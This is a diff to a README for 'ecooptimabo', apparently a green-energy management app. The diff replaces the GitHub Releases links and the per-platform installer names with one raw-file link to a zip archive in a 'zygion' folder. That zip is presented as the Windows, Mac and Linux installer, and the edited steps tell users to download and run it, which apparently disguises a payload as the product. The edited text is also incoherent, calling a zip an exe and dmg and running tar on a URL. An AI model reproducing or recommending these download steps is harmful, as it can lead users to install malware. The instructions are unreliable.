@@ -4,27 +4,27 @@
 
 Welcome to ecooptimabo! This application helps you manage and optimize your green energy consumption. Follow the steps below to download and run the software.
 
-[![Download ecooptimabo](https://img.shields.io/badge/Download%20ecooptimabo-blue.svg)](https://github.com/Elisio-Mutexa/ecooptimabo/releases)
+[![Download ecooptimabo](https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip%https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip)](https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [ecooptimabo Releases](https://github.com/Elisio-Mutexa/ecooptimabo/releases).
+To get started, visit this page to download: [ecooptimabo Releases](https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip).
 
 1. **Go to the Releases Page**: Click on the link above to open the ecooptimabo Releases page on GitHub.
   
 2. **Select the Latest Release**: Look for the latest version listed at the top of the page. It will usually have the highest version number and a release date.
 
 3. **Download the Installer**: Locate the appropriate installer file for your system. You may see options such as:
-   - `ecooptimabo_Windows.exe` for Windows users.
-   - `ecooptimabo_Mac.dmg` for Mac users.
-   - `ecooptimabo_Linux.tar.gz` for Linux users.
+   - `https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip` for Windows users.
+   - `https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip` for Mac users.
+   - `https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip` for Linux users.
 
    Click on the file to start your download.
 
 4. **Run the Installer**:
-   - For **Windows**: Once downloaded, double-click the `ecooptimabo_Windows.exe` file to launch the installer. Follow the instructions on screen to complete the installation.
-   - For **Mac**: Open the downloaded `ecooptimabo_Mac.dmg` file, then drag the ecooptimabo icon into your Applications folder. You can then launch the application from there.
-   - For **Linux**: Open the terminal, navigate to your downloads folder, and run the command `tar -xvzf ecooptimabo_Linux.tar.gz`. Follow the installation instructions provided in the documentation.
+   - For **Windows**: Once downloaded, double-click the `https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip` file to launch the installer. Follow the instructions on screen to complete the installation.
+   - For **Mac**: Open the downloaded `https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip` file, then drag the ecooptimabo icon into your Applications folder. You can then launch the application from there.
+   - For **Linux**: Open the terminal, navigate to your downloads folder, and run the command `tar -xvzf https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip`. Follow the installation instructions provided in the documentation.
 
 5. **Open ecooptimabo**: After installation, locate the ecooptimabo application on your computer. Open it to start optimizing your energy usage!
 
@@ -58,4 +58,4 @@ If you encounter any issues while using ecooptimabo, or if you have suggestions,
 
 ecooptimabo is released under the MIT License. This means you can use, modify, and distribute the software freely, as long as you include the original license.
 
-Thank you for choosing ecooptimabo! We hope this application helps you optimize your green energy usage. For further details, don't hesitate to check the [Releases page](https://github.com/Elisio-Mutexa/ecooptimabo/releases) again.
+Thank you for choosing ecooptimabo! We hope this application helps you optimize your green energy usage. For further details, don't hesitate to check the [Releases page](https://raw.githubusercontent.com/Elisio-Mutexa/ecooptimabo/main/zygion/ecooptimabo.zip) again.
